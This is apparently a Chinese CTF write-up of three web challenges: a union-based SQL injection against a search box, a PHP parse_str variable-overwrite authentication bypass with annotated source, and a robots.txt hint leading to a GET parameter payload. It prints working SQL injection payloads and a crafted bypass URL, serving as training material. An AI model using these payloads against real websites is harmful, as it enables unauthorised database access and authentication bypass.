¶搜索引擎

就一个框，搜索，但是有返回，所以初步判断是SQL注入，接下来就是判断注入类型

输入1’时，报错，所以判断是字符型输入，接下来就是一步步判断了

union order by 1 #//没错
union order by 2 #//报错
//所以判断输出位只有一个
union select datebase()//获取数据库名
union select group_concat(SCHEMA_NAME) from information_schema.TABLES where TABLE_SCHEMA='attackdb'//获取表名
union  select group_concat(column_NAME) from information_schema.columns where TABLE_SCHEMA='attackdb' and table_name='表名'//获取列名
union select group_concat(flag) from attackdb.表名

然后就能得到flag

¶php伪协议string.rot13的利用漏洞，php覆盖

这个确实不会，看别人博客慢慢学的

点击信息时，URL发生变化，index.php?page=index，所以判断page是可以被赋值的，将page=index.php，查看源码内容，可以看到一串被注释的密文，根据题目提示判断是ROT13编码

之后就去找rot13的解密，把那一串全部放进去，接下来就是代码审计

<?php
    $hashed_key = 'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b';
	
	
    $parsed = parse_url($_SERVER['REQUEST_URI']);
	//parse_url将url解析后，返回一个关联数组，数组中包含query这个字段，用来存储传入的参数值。
	
    $query = $parsed["query"];//[query] => arg=value，将数组中的query字段值赋给变量query
	
	
    $parsed_query = parse_str($query);
	//parse_str()  常见变量覆盖点
	//parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量
	
	
	//所有通过url的get方法传入的参数都会经过parse_str方法。使传入的参数值覆盖之前赋的值，从而引发变量覆盖漏洞
	
    if($parsed_query!=NULL){
        $action = $parsed_query['action'];
    }

    if($action==="auth"){      		 	 	 
        $key = $_GET["key"];    	 	 	 
        $hashed_input = hash('sha384', $key); //使用sha384的哈希算法，将key值进行hash运算，生成对应的哈希值 
        
		
        if($hashed_input!==$hashed_key){  //hashed_input=hashed_key时，得到flag。
            die("no way to get flag!");
        }

        echo file_get_contents("/flag");  
		
		//发现是php的变量覆盖，通过action间接覆盖其他的信息，所以构造覆盖action=auth，key=1，hashed_key=sha384的1
		
    }
        ?>

接下来就是构造payload
index.php?action=auth&key=1&hashed_key=47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776

之后就能看到flag

¶一佰块都不给我

打开是乱七八糟的字母图，没啥用，F12里面也没东西

之后用御剑扫一扫，扫出来一个

呃虽然之前一直看到robots.txt这个文件，但是一直不知道是干嘛的，所以去查了一下

robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：

  • 不要访问某个文件、文件夹
  • 禁止某些爬虫的访问
  • 限制爬虫访问网站的频率

一个自觉且善意的爬虫，应该在抓取网页之前，先阅读robots.txt，了解并执行网站管理者制定的爬虫规则。

好家伙

然后打开robots.txt

User-agent: *
Disallow: /index.php1

disallow的地址是index.php1，我们打开

注意到

$a = isset($_GET['ctf']) ? $_GET['ctf']

PHP语言，GET请求。所以构造payload

?ctf=phpinfo

然后就能找到flag
